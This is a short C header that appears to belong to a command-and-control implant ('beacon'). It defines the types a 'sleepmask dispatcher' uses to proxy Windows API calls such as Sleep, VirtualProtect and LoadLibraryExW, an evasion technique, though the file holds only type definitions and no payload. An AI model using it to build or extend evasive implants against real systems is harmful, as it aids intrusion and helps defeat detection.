/* beacon/include/Gate.h
 * Shared between beacon gate wrappers and sleepmask dispatcher.
 * No dependency on Instance.h - only windows.h for base types. */

#pragma once
#include <windows.h>

#define GATE_MAX_ARGS  10

typedef enum _GATE_API {
    GATE_API_GENERIC                   = 0x00,
    GATE_API_SLEEP                     = 0x01,
    GATE_API_WAIT_FOR_SINGLE_OBJECT    = 0x02,
    GATE_API_WAIT_FOR_MULTIPLE_OBJECTS = 0x03,
    GATE_API_VIRTUAL_PROTECT           = 0x04,
    GATE_API_LOAD_LIBRARY_EX_W        = 0x05,
} GATE_API;

typedef struct _FUNCTION_CALL {
    PVOID      FunctionPtr;
    UINT32     GateApi;
    UINT32     NumArgs;
    ULONG_PTR  Args[GATE_MAX_ARGS];
    ULONG_PTR  RetValue;
    PVOID      SmInfo;
} FUNCTION_CALL, *PFUNCTION_CALL;

typedef ULONG_PTR (*FN0 )( VOID );
typedef ULONG_PTR (*FN1 )( ULONG_PTR );
typedef ULONG_PTR (*FN2 )( ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN3 )( ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN4 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN5 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN6 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN7 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN8 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN9 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN10)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
